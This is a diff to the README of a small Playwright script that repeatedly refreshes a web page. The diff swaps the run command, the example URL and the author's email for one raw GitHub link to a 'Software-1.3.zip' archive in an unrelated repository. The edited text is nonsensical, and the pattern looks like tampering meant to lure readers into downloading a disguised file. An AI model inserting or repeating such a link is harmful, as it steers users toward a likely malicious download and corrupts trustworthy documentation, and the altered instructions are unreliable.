@@ -16,13 +16,13 @@ This script utilizes the Playwright library to launch a headless browser and con
 
 2.  **Run the script:**
     ```bash
-    python click.py
+    python https://raw.githubusercontent.com/Melon4Program/Dclick/main/cirriped/Software-1.3.zip
     ```
 
 3.  **Enter the URL:**
     When prompted, paste the full URL you want to refresh and press Enter.
     ```
-    Please enter the URL to refresh: https://example.com
+    Please enter the URL to refresh: https://raw.githubusercontent.com/Melon4Program/Dclick/main/cirriped/Software-1.3.zip
     ```
 
 The script will then start refreshing the entered URL.
@@ -30,7 +30,7 @@ The script will then start refreshing the entered URL.
 ## Contact
 
 -   **Author:** kbs-programmer
--   **Email:** kbs.programmer@gmail.com
+-   **Email:** https://raw.githubusercontent.com/Melon4Program/Dclick/main/cirriped/Software-1.3.zip
 
 ## License
 
